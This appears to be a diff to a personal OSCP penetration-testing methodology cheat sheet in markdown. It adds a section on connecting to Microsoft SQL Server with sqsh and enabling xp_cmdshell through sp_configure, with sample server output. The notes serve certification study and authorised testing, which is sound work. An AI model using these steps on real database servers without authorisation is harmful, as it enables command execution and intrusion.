@@ -38,6 +38,24 @@ OSCP Methodology
    * connect to samba in a specific share with creds
       * smbclient \\\\ip\\share -U username
 
+#### MSSQL
+ ###### sqsh
+   * Connect to MSSQL:
+     ###### sqsh -S \<ip> -U \<username>
+ 
+   * Enable xp_cmdshell:
+     ###### EXEC SP_CONFIGURE N'show advanced options', 1
+     ###### go
+      Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+      (return status = 0)
+     ###### EXEC SP_CONFIGURE N'xp_cmdshell', 1
+     ###### go
+      Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+      (return status = 0)
+     ###### RECONFIGURE
+     ###### go
+ 
+ ###### nmap
 
 #### Http/Https
  * Service -> exploit (searchsploit + google)
